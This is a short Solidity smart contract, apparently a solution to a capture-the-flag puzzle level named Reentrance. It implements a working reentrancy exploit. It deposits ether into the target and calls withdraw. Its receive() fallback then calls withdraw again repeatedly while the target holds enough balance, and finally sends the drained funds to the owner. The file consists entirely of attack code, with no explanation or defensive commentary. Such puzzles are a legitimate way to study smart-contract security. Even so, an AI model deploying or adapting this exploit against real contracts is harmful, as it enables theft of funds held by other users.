// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Ownable} from "@openzeppelin3.3.0/contracts/access/Ownable.sol";
import {Reentrance} from "../../puzzles/10/Reentrance.sol";

contract ReentrancyAttacker is Ownable {
    Reentrance public puzzleContract;

    constructor(address _reentrance) public {
        puzzleContract = Reentrance(payable(_reentrance));
    }

    receive() external payable {
        if (address(puzzleContract).balance >= msg.value) {
            puzzleContract.withdraw(msg.value);
        }
    }

    function attack() public payable onlyOwner {
        puzzleContract.donate{value: msg.value}(address(this));
        puzzleContract.withdraw(msg.value);
    }

    function withdraw() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }
}
